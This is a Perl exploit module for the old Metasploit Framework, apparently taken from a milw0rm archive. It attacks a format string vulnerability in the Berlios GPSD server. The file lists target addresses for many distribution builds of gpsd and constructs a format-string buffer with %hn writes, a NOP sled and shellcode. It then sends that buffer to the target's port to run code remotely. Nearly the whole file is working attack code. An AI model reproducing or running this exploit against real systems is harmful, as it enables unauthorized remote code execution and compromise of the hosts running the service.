package Msf::Exploit::gpsd_format_string;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use IO::Socket;

my $advanced = { };

my $info = {
    'Name'     => 'Berlios GPSD Format String Vulnerability',
    'Version'  => '$ 1.0 $',
    'Authors'  => [ 'Enseirb <senotier [at] enseirb.fr>', ],
    'Arch'     => [ 'x86' ],
    'OS'       => [ 'linux' ],
    'Priv'     => 1,
    
    'UserOpts' =>
    {
	'RHOST' => [1, 'ADDR', 'The target address'],
	'RPORT' => [1, 'PORT', 'The target port', 2947],
		
    },
    
    'Payload' =>
    {
	'Space'    => 1004,
	'BadChars' => "\x00\x0a\x0d\x0c",
    },
    
    'Targets' =>
	
	[
	 [ "gpsd-1.91-1.i386.rpm", 0x0804f250,0x41424344 ], # .rpms Tested on Redhat 9.0
	 [ "gpsd-1.92-1.i386.rpm", 0x0804f630,0x41424344 ],
	 [ "gpsd-1.93-1.i386.rpm", 0x0804e154,0x41424344 ],
	 [ "gpsd-1.94-1.i386.rpm", 0x0804f260,0x41424344 ],
	 [ "gpsd-1.95-1.i386.rpm", 0x0804f268,0x41424344 ],
	 [ "gpsd-1.96-1.i386.rpm", 0x41424344,0x41424344 ],
	 [ "gpsd-1.97-1.i386.rpm", 0x0804b14c,0x41424344 ],
	 [ "gpsd-2.1-1.i386.rpm", 0x0804c7a0,0x41424344 ],
	 [ "gpsd-2.2-1.i386.rpm", 0x0804c7a0,0x41424344 ],
	 [ "gpsd-2.3-1.i386.rpm", 0x0804c730,0xbfffd661 ],
	 [ "gpsd-2.4-1.i386.rpm", 0x0804c7b8,0xbfffde71 ],
	 [ "gpsd-2.5-1.i386.rpm", 0x0804c7dc,0xbfffdc09 ],
	 [ "gpsd-2.6-1.i386.rpm", 0x0804c730,0xbffff100 ],
	 [ "gpsd-2.7-1.i386.rpm", 0x0804c5bc,0xbfffcabc ],
	 [ "gpsd_2.6-1_i386.deb", 0x0804c7c4,0xbfffedc8 ], 
	 [ "gpsd_2.7-1_i386.deb", 0x0804c6c4,0xbfffc818 ],
	 [ "gpsd_2.7-2_i386.deb", 0x0804c770,0xbfffee70 ],
	 ["SuSE 9.1 compiled 2.0", 0x0804c818,0xbfffe148 ], 
	 [ "Slackware 9.0 compiled 2.0", 0x0804b164,0xbfffd7d6 ],
	 [ "Slackware 9.0 compiled 2.7  ", 0x0804c3ec,0xbfffe65c ], 
	 [ "Debug              ", 0x41424344,0xdeadbeef ], 
	 ],


    'Description' =>
	Pex::Text::Freeform(qq{
	    This module exploits a format string vulnerability in the Berlios GPSD server.
		This vulnerability was discovered by Kevin Finisterre.
	    }),
		
    'Keys' => ['gpsd'],
		
		'DisclosureDate' => 'May 25 2005',
		
	    };

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
    return($self);
}

sub Exploit {
    my $self = shift;
    my $target_idx  = $self->GetVar('TARGET');
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    my $target = $self->Targets->[$target_idx];
    
    $self->Print("[*] Reading information from target " . $target_host . ": ");
        
    my $offset = 17;
    my $dump_fmt = 7;
    my $al = 3;
    my ($hi,$lo);
    my ($shift0,$shift1);
    my $buf;
    
    $hi = ($target->[2] >> 0) & 0xffff;
    $lo = ($target->[2] >> 16) & 0xffff;

    $shift0 = sprintf("%d",$hi) - sprintf("%d",$offset) - ($dump_fmt * 8 + 16 + $al);
    $shift1 = (sprintf("%d",0x10000) +  sprintf("%d",$lo)) - sprintf("%d",$hi);

    $buf  = "A" x 3 . "B" x 4; 
    $buf .=  pack('V',$target->[1]);
    $buf .= "B" x 4;
    $buf .=  pack('V',$target->[1] + 0x2);
    $buf .= "%.8x" x7 ."%.".$shift0."lx%hn"."%.".$shift1."lx%hn";
    $buf .= $self->MakeNops(3000) . $shellcode ; 
    
    my $s = Msf::Socket::Tcp->new
	(
	 'PeerAddr'  => $target_host,
	 'PeerPort'  => $target_port,
	 );
    
    if ($s->IsError) {
	$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
	return;
    }
    
    $s->Send($buf);
    $s->Close();

	return;
}

1;

# milw0rm.com [2007-01-08]
